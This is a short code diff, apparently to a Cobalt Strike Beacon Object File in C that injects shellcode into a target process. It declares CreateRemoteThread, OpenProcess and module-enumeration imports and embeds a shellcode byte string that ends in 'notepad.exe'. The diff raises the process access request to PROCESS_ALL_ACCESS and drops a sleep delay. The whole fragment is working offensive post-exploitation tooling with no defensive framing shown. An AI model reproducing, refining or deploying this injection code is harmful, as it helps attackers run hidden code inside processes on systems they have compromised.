@@ -21,7 +21,7 @@ WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY
 WINBASEAPI int __cdecl MSVCRT$strcmp(const char* s1, const char* s2);
 WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
 WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
-WINBASEAPI VOID WINAPI Sleep (DWORD dwMilliseconds);
+WINBASEAPI VOID WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
 
 // function name definitions for ease of use
 #define OpenProcess             KERNEL32$OpenProcess
@@ -67,14 +67,12 @@ void go(char * buff, int len)
         "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
 
     // obtain handle to the target process with necessary access rights
-    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PROCESSID);
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESSID);
     if (hProcess == NULL)
     {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Open Process. Error Code: %d\n", GetLastError());
         return 1;
     }
-
-    Sleep(10000);
 
     // enumerate remote modules, return array of handles
     if (!EnumProcessModulesEx(hProcess, hModules, sizeof(hModules), &cbNeeded, dwFilter))
